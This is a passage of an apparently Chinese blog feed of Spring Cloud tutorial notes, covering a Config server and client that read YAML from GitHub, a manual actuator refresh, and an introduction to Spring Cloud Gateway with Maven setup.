class="title">ConfigCenterMain3344</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            SpringApplication.run(ConfigCenterMain3344<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windows下修改hosts文件，增加映射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 config-3344.com</span><br></pre></td></tr></table></figure><p>测试通过Config微服务是否可以从GitHub上获取配置内容</p><ul><li>启动ConfigCenterMain3344</li><li>浏览器防问 - <a href="http://config-3344.com:3344/master/config-dev.yml" target="_blank" rel="noopener">http://config-3344.com:3344/master/config-dev.yml</a></li><li>页面返回结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config:</span><br><span class="line">  info: &quot;master branch,springcloud-config&#x2F;config-dev.yml version&#x3D;7&quot;</span><br></pre></td></tr></table></figure><p>配置读取规则</p><p>官方文档[<a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-config/2.2.1.RELEASE/reference/html/#_quick_start" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-config/2.2.1.RELEASE/reference/html/#_quick_start</a>]</p><ul><li>/{label}/{application}-{profile}.yml（推荐）<ul><li>master分支<br><a href="http://config-3344.com:3344/master/config-dev.yml" target="_blank" rel="noopener">http://config-3344.com:3344/master/config-dev.yml</a><br><a href="http://config-3344.com:3344/master/config-test.yml" target="_blank" rel="noopener">http://config-3344.com:3344/master/config-test.yml</a><br><a href="http://config-3344.com:3344/master/config-prod.yml" target="_blank" rel="noopener">http://config-3344.com:3344/master/config-prod.yml</a></li><li>dev分支<br><a href="http://config-3344.com:3344/dev/config-dev.yml" target="_blank" rel="noopener">http://config-3344.com:3344/dev/config-dev.yml</a><br><a href="http://config-3344.com:3344/dev/config-test.yml" target="_blank" rel="noopener">http://config-3344.com:3344/dev/config-test.yml</a><br><a href="http://config-3344.com:3344/dev/config-prod.yml" target="_blank" rel="noopener">http://config-3344.com:3344/dev/config-prod.yml</a></li></ul></li><li>/{application}-{profile}.yml<ul><li><a href="http://config-3344.com:3344/config-dev.yml" target="_blank" rel="noopener">http://config-3344.com:3344/config-dev.yml</a></li><li><a href="http://config-3344.com:3344/config-test.yml" target="_blank" rel="noopener">http://config-3344.com:3344/config-test.yml</a></li><li><a href="http://config-3344.com:3344/config-prod.yml" target="_blank" rel="noopener">http://config-3344.com:3344/config-prod.yml</a></li><li><a href="http://config-3344.com:3344/config-xxxx.yml(不存在的配置" target="_blank" rel="noopener">http://config-3344.com:3344/config-xxxx.yml(不存在的配置</a>)</li></ul></li><li>/{application}/{profile}[/{label}]<ul><li><a href="http://config-3344.com:3344/config/dev/master" target="_blank" rel="noopener">http://config-3344.com:3344/config/dev/master</a></li><li><a href="http://config-3344.com:3344/config/test/master" target="_blank" rel="noopener">http://config-3344.com:3344/config/test/master</a></li><li><a href="http://config-3344.com:3344/config/test/dev" target="_blank" rel="noopener">http://config-3344.com:3344/config/test/dev</a></li></ul></li></ul><ul><li><p>重要配置细节总结</p></li><li><p>/{name}-{profiles}.yml</p></li><li><p>/{label}-{name}-{profiles}.yml</p></li><li><p>label：分支(branch)</p></li><li><p>name：服务名</p></li><li><p>profiles：环境(dev/test/prod)</p></li></ul><p>成功实现了用SpringCloud Config通过GitHub获取配置信息</p><h3 id="Config客户端配置与测试"><a href="#Config客户端配置与测试" class="headerlink" title="Config客户端配置与测试"></a>Config客户端配置与测试</h3><p><strong>新建cloud-config-client-3355</strong></p><p>POM</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>LearnCloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-config-client-3355<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--添加消息总线RabbitMQ支持--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-bus-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>bootstrap.yml</strong></p><p>applicaiton.yml是用户级的资源配置项</p><p>bootstrap.yml是系统级的，优先级更加高</p><p>Spring Cloud会创建一个Bootstrap Context，作为Spring应用的Application Context的父上下文。</p><p>初始化的时候，BootstrapContext负责从外部源加载配置属性并解析配置。这两个上下文共享一个从外部获取的Environment。</p><p>Bootstrap属性有高优先级，默认情况下，它们不会被本地配置覆盖。Bootstrap context和Application Context有着不同的约定，所以新增了一个bootstrap.yml文件，保证Bootstrap Context和Application Context配置的分离。</p><p>要将Client模块下的application.yml文件改为bootstrap.yml,这是很关键的，因为bootstrap.yml是比application.yml先加载的。bootstrap.yml优先级高于application.yml。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3355</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">config-client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="comment">#Config客户端配置</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">label:</span> <span class="string">master</span> <span class="comment">#分支名称</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">config</span> <span class="comment">#配置文件名称</span></span><br><span class="line">      <span class="attr">profile:</span> <span class="string">dev</span> <span class="comment">#读取后缀名称   上述3个综合：master分支上config-dev.yml的配置文件被读取http://config-3344.com:3344/master/config-dev.yml</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">http://localhost:3344</span> <span class="comment">#配置中心地址k</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure><p>controller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.context.config.annotation.RefreshScope;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;config.info&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String configInfo;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/configInfo"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getConfigInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> configInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试</strong></p><ul><li>启动Config配置中心3344微服务并自测<ul><li><a href="http://config-3344.com:3344/master/config-prod.yml" target="_blank" rel="noopener">http://config-3344.com:3344/master/config-prod.yml</a></li><li><a href="http://config-3344.com:3344/master/config-dev.yml" target="_blank" rel="noopener">http://config-3344.com:3344/master/config-dev.yml</a></li></ul></li></ul><ul><li>启动3355作为Client准备访问<ul><li><a href="http://localhost:3355/configlnfo" target="_blank" rel="noopener">http://localhost:3355/configlnfo</a></li></ul></li></ul><p><strong>成功实现了客户端3355访问SpringCloud Config3344通过GitHub获取配置信息可题随时而来</strong></p><p><strong>分布式配置的动态刷新问题</strong></p><ul><li>Linux运维修改GitHub上的配置文件内容做调整</li><li>刷新3344，发现ConfigServer配置中心立刻响应</li><li>刷新3355，发现ConfigClient客户端没有任何响应</li><li>3355没有变化除非自己重启或者重新加载</li><li>难到每次运维修改配置文件，客户端都需要重启??噩梦</li></ul><h3 id="Config动态刷新之手动版"><a href="#Config动态刷新之手动版" class="headerlink" title="Config动态刷新之手动版"></a>Config动态刷新之手动版</h3><p>自动刷新见下篇文章bus消息总线</p><p>避免每次更新配置都要重启客户端微服务3355</p><p><strong>动态刷新步骤</strong>：</p><p>修改3355模块</p><p>POM引入actuator监控</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改YML，添加暴露监控端口配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暴露监控端点</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">"*"</span></span><br></pre></td></tr></table></figure><p>@RefreshScope业务类Controller修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.context.config.annotation.RefreshScope;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span><span class="comment">//&lt;-----</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigClientController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试</p><p>此时修改github配置文件内容 -&gt; 访问3344 -&gt; 访问3355</p><p><a href="http://localhost:3355/configInfo" target="_blank" rel="noopener">http://localhost:3355/configInfo</a></p><p>3355改变没有??? <strong>没有</strong>，还需一步</p><p>How</p><p>需要运维人员发送Post请求刷新3355</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &quot;http:&#x2F;&#x2F;localhost:3355&#x2F;actuator&#x2F;refresh&quot;</span><br></pre></td></tr></table></figure><p>再次测试</p><p><a href="http://localhost:3355/configInfo" target="_blank" rel="noopener">http://localhost:3355/configInfo</a></p><p>3355改变没有??? 改了。</p><p>成功实现了客户端3355刷新到最新配置内容，避免了服务重启</p><p>想想还有什么问题?</p><ul><li><p>假如有多个微服务客户端3355/3366/3377</p></li><li><p>每个微服务都要执行—次post请求，手动刷新?</p></li><li><p>可否广播，一次通知，处处生效?</p></li><li><p>我们想大范围的自动刷新，求方法</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> spring cloud </tag>
            
            <tag> cpnfig配置中心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GateWay网关</title>
      <link href="/2021/08/18/GateWay%E7%BD%91%E5%85%B3/"/>
      <url>/2021/08/18/GateWay%E7%BD%91%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="GateWay是什么"><a href="#GateWay是什么" class="headerlink" title="GateWay是什么"></a>GateWay是什么</h3><p>上一代zuul 1.x官网[<a href="https://github.com/Netflix/zuul/wiki" target="_blank" rel="noopener">https://github.com/Netflix/zuul/wiki</a>]</p><p>Gateway官网[<a href="https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/" target="_blank" rel="noopener">https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.1.RELEASE/reference/html/</a>]</p><p>概述</p><p>Cloud全家桶中有个很重要的组件就是网关，在1.x版本中都是采用的Zuul网关;</p><p>但在2.x版本中，zuul的升级一直跳票，SpringCloud最后自己研发了一个网关替代Zuul，那就是SpringCloud Gateway—句话：gateway是原zuul1.x版的替代</p><p><img src="/img/springcloud2020/GateWay0.png" alt=""></p><p>Gateway是在Spring生态系统之上构建的API网关服务，基于Spring 5，Spring Boot 2和Project Reactor等技术。</p><p>Gateway旨在提供一种简单而有效的方式来对API进行路由，以及提供一些强大的过滤器功能，例如:熔断、限流、重试等。</p><p>SpringCloud Gateway是Spring Cloud的一个全新项目，基于Spring 5.0+Spring Boot 2.0和Project Reactor等技术开发的网关，它旨在为微服务架构提供—种简单有效的统一的API路由管理方式。</p><p>SpringCloud Gateway作为Spring Cloud 生态系统中的网关，目标是替代Zuul，在Spring Cloud 2.0以上版本中，没有对新版本的Zul 2.0以上最新高性能版本进行集成，仍然还是使用的Zuul 1.x非Reactor模式的老版本。而为了提升网关的性能，SpringCloud Gateway是基于WebFlux框架实现的，而WebFlux框架底层则使用了高性能的Reactor模式通信框架Netty。</p><p>Spring Cloud Gateway的目标提供统一的路由方式且基于 Filter链的方式提供了网关基本的功能，例如:安全，监控/指标，和限流。</p><h3 id="微服务架构中网关的位置"><a href="#微服务架构中网关的位置" class="headerlink" title="微服务架构中网关的位置"></a><strong>微服务架构中网关的位置</strong></h3><p><img src="/img/springcloud2020/GateWay1.png" alt=""></p><h3 id="GateWay非阻塞异步模型"><a href="#GateWay非阻塞异步模型" class="headerlink" title="GateWay非阻塞异步模型"></a>GateWay非阻塞异步模型</h3><p>有Zuull了怎么又出来Gateway？我们为什么选择Gateway?</p><ol><li>netflix不太靠谱，zuul2.0一直跳票，迟迟不发布。</li></ol><ul><li><p>一方面因为Zuul1.0已经进入了维护阶段，而且Gateway是SpringCloud团队研发的，是亲儿子产品，值得信赖。而且很多功能Zuul都没有用起来也非常的简单便捷。</p></li><li><p>Gateway是基于异步非阻塞模型上进行开发的，性能方面不需要担心。虽然Netflix早就发布了最新的Zuul 2.x，但Spring Cloud貌似没有整合计划。而且Netflix相关组件都宣布进入维护期；不知前景如何?</p></li><li><p>多方面综合考虑Gateway是很理想的网关选择。</p></li></ul><ol><li>SpringCloud Gateway具有如下特性</li></ol><ul><li><p>基于Spring Framework 5，Project Reactor和Spring Boot 2.0进行构建；</p></li><li><p>动态路由：能够匹配任何请求属性；</p></li><li><p>可以对路由指定Predicate (断言)和Filter(过滤器)；</p></li><li><p>集成Hystrix的断路器功能；</p></li><li><p>集成Spring Cloud 服务发现功能；</p></li><li><p>易于编写的Predicate (断言)和Filter (过滤器)；</p></li><li><p>请求限流功能；</p></li><li><p>支持路径重写。</p></li></ul><h3 id="Gateway工作流程"><a href="#Gateway工作流程" class="headerlink" title="Gateway工作流程"></a>Gateway工作流程</h3><p>三大核心概念</p><ul><li><p>Route(路由) - 路由是构建网关的基本模块,它由ID,目标URI,一系列的断言和过滤器组成,如断言为true则匹配该路由；</p></li><li><p>Predicate(断言) - 参考的是Java8的java.util.function.Predicate，开发人员可以匹配HTTP请求中的所有内容(例如请求头或请求参数),如果请求与断言相匹配则进行路由；</p></li><li><p>Filter(过滤) - 指的是Spring框架中GatewayFilter的实例,使用过滤器,可以在请求被路由前或者之后对请求进行修改。</p></li></ul><p><img src="/img/springcloud2020/GateWay2.png" alt=""></p><p>web请求，通过一些匹配条件，定位到真正的服务节点。并在这个转发过程的前后，进行一些精细化控制。</p><p>predicate就是我们的匹配条件；而fliter，就可以理解为一个无所不能的拦截器。有了这两个元素，再加上目标uri，就可以实现一个具体的路由了。</p><h3 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h3><p>1.新建Module - cloud-gateway-gateway9527</p><p>2.pom</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>LearnCloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-gateway-gateway9527<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--gateway--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--eureka-client--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引入自己定义的api通用包，可以使用Payment支付Entity --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.lun.springcloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--一般基础配置类--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 